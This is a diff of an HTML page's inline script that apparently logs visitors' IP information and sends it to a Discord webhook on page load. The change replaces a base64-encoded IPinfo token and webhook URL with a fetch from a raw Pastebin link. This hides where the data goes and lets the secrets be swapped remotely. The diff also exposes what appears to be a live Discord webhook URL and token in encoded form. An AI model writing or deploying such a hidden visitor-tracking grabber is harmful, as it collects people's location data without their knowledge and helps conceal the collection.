@@ -7,17 +7,20 @@
 </head>
 <body>
     <script>
-        // Encoded values for IPinfo token and webhook URL
-        const encodedToken = 'YWZiY2U5OWUwOTk5ZWQ=';
-        const encodedWebhook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI4MDk0MTc1MTYyNDAwNzcyMC9zdHdkTFc4RDg2NkhQVkRaUEFHNVhvWURpNmZBOTFqZldQYWFTNm5tVGNzYjI4UVU2dGRQSkVCVnVUT19SUDV0UWdROQ==';
+        // Pastebin link with encoded token and webhook
+        const pastebinUrl = 'https://pastebin.com/raw/quyru4jf';
 
-        // Decode Base64 values
-        const token = atob(encodedToken);
-        const webhookUrl = atob(encodedWebhook);
-
-        // Fetch IP data from IPinfo and send it to the Discord webhook
         async function fetchDataAndSend() {
             try {
+                // Fetch encoded token and webhook from Pastebin
+                const pastebinResponse = await fetch(pastebinUrl);
+                const encodedData = await pastebinResponse.text();
+                const decodedData = atob(encodedData).split(',');
+
+                // Extract token and webhook URL
+                const token = decodedData[0];
+                const webhookUrl = decodedData[1];
+
                 // Fetch IP info data
                 const response = await fetch(`https://ipinfo.io/json?token=${token}`);
                 const data = await response.json();
